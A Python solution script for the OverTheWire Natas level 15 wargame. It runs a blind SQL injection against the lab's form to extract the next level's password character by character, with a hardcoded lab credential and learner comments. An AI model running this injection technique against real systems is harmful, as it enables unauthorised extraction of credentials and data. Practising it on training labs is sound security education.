#!/bin/python3

import string
import requests 
import re 
import html.parser

username = 'natas15'
oldpassword = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url = 'http://%s.natas.labs.overthewire.org?debug=true' % (username)
session = requests.Session()

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

password = ""
temppass = ""
for i in range(0,len(oldpassword)):
    print (i)
    for j in range(0,len(charset)):

        temppass = password + charset[j] + "%"
        print ("current attempt = " + temppass)

        query = 'natas16" AND BINARY password LIKE ' + '"' + temppass +'"#' 
        data = { "username" : query,  "submit" : "Check existence"} 
        response = session.post(url, data =data, auth = (username,oldpassword) )

        content = html.unescape(response.text)

        if (re.search("This user exists",content)):
            password = password + charset[j] 
            print ("password so far = " + password)
            break
        else:
            continue

print ("password = " + password)

#for each character in the password
#iterate through each possible character 
#check with the database to see if that is in the password
#if yes then move on to the next char
#if no keep going 
#until all the chars have been found

#looking at older passwords i can see that they can use
#all alpha-numerics including capitals
#this might take a while
